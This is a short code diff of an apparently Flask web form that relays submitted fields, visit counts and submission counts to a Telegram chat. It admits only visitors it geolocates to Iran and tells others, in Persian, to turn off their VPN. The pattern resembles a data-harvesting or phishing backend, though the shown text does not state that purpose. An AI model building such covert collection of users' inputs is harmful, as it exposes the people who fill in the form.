@@ -51,15 +51,26 @@ async def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
         {submited} بار فیلد هارو پر کرده 
         {time} {day} {DayOfMonth} {Month} 
         """
-    await SendMessageToTelegramDirect(message)
+    await SendMessageToTelegramIndirect(message)
+
+def ipaddress(request):
+    try:
+        if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
+            ip_addr = request.environ['REMOTE_ADDR']
+        else:
+            ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
+        return ip_addr
+    except Exception as err:
+        print(f"Error getting ipaddress : {err}")
 
 @app.route('/', methods=['GET', 'POST'])
 async def form_page():
-    Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
+    # Ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr) 
+    Ip = ipaddress(request)
     # IsFromIran = True  # For Debug
     IsFromIran = requests.get(f"https://geolocation-db.com/json/{Ip}&position=true").json().get("country_name") == "Iran"
     if not IsFromIran:
-        return "<h1>برای استفاده از سرویس فیلترشکن خود را خاموش کنید</h1>" 
+        return "<h1>برای استفاده از سرویس فیلترشکن خود را خاموش کنید</h1>\n"+ Ip 
     try:
         data = jsonify(request.json).get_json()
         Scode = data.get('SecretCode')
